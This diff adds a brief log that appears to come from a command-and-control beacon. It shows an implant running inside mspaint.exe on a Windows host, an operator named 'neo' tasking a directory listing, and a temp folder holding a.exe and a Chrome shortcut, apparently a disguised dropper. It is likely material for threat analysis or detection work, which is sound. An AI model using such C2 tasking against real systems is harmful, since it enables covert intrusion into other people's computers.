@@ -1,0 +1,12 @@
+12/15 09:15:35 UTC [metadata] 172.22.53.18 <- 172.22.53.18; computer: ACER; user: david; process: mspaint.exe; pid: 19340; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
+12/15 09:15:37 UTC [input] <neo> ls
+12/15 09:15:37 UTC [task] <> Tasked beacon to list files in .
+12/15 09:16:31 UTC [checkin] host called home, sent: 19 bytes
+12/15 09:16:31 UTC [output]
+C:\Users\david\AppData\Local\Temp\RarSFX4\*
+D	0	12/15/2022 16:14:31	.
+D	0	12/15/2022 16:15:52	..
+F	927232	12/15/2022 16:05:46	a.exe
+F	2247	12/15/2022 15:25:31	Google Chrome.lnk
+
+
